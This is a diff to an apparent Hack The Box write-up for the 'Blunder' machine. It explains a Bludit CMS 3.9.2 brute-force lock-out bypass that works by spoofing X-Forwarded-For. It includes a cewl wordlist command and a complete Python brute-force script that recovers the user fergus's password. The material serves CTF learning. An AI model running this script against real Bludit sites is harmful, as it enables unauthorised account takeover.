@@ -108,7 +108,77 @@ todo.txt                [Status: 200, Size: 118, Words: 20, Lines: 5]
 
 By Google searching, I found a potential [BLUDIT CMS 3.9.2 exploit](https://www.exploit-db.com/exploits/48701). But it required valid login credentials to the `/admin` page. 
 
+Further searching found another exploit to bypass the brute-force lock-out mitigation for the BLUDIT CMS 3.9.2 - [Bludit Brute Force Mitigation Bypass](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)
 
+The vulnerability was simply that one of the functions `getUserIp` within the `lb-kernel/security.class.php` script did not validate the source IP of the login attempt; therefore, an attacker can spoof the source IP with any arbitrary value to bypass the brute-force mitigation. 
+
+```php
+public function getUserIp()
+{
+  if (getenv('HTTP_X_FORWARDED_FOR')) {
+    $ip = getenv('HTTP_X_FORWARDED_FOR');
+  } elseif (getenv('HTTP_CLIENT_IP')) {
+    $ip = getenv('HTTP_CLIENT_IP');
+  } else {
+    $ip = getenv('REMOTE_ADDR');
+  }
+  return $ip;
+}
+```
+
+In order to perform the password brute-forcing, I `cewl` the web page to create the potential wordlist. 
+
+```console
+# cewl http://10.10.10.191 > tmp && cewl http://10.10.10.191/about >> tmp && sort -u tmp > passList.txt
+```
+
+I modified the provided POC script in order to supply the password file. Using this script, I was ablt to obtain the password for the user `fergus`.
+
+```python
+#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+wordlist = []
+
+with open('passList.txt') as fp:
+    line = fp.read().splitlines()
+   
+    for password in line:
+        session = requests.Session()
+        login_page = session.get(login_url)
+        csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+        print('[INFO] Trying: {p}'.format(p = password))
+
+        headers = {
+            'X-Forwarded-For': password,
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+            'Referer': login_url
+        }
+
+        data = {
+            'tokenCSRF': csrf_token,
+            'username': username,
+            'password': password,
+            'save': ''
+        }
+
+        login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+        if 'location' in login_result.headers:
+            if '/admin/dashboard' in login_result.headers['location']:
+                print()
+                print('[INFO] SUCCESS: Password found!')
+                print('[INFO] Use {u}:{p} to login.'.format(u = username, p = password))
+                print()
+                break
+```
+
+![image](/assets/img/post/htb/blunder/06_bludit-pass.png)
 
 
 
